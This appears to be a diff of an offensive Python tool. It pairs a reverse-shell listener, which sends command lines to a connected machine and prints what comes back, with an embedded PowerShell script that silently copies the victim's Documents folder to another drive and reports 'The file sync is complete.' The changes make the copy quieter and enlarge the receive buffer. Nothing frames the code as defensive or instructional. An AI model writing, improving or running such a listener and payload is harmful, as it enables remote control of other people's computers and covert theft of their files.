@@ -12,7 +12,7 @@ $destinationFolder = "$mydrive\\$foldername"
 if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
 $target = [Environment]::GetFolderPath("MyDocuments")
 ls $target
-Copy-Item -Path $target\\* -Destination $destinationFolder -recurse -Force -Verbose
+Copy-Item -Path $target\\* -Destination $destinationFolder -recurse -Force
 Write-Host "The file sync is complete." """
 
 def reverse_shell_listener():
@@ -29,7 +29,7 @@ def reverse_shell_listener():
 		for line in codelines:
 			print("Sending: " + line)
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
-			data = conn.recv(1024).decode("UTF-8") # Receive output from command.
+			data = conn.recv(4096).decode("UTF-8") # Receive output from command.
 			print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
 		print("...listener terminated using [ctrl+c], Shutting down!")
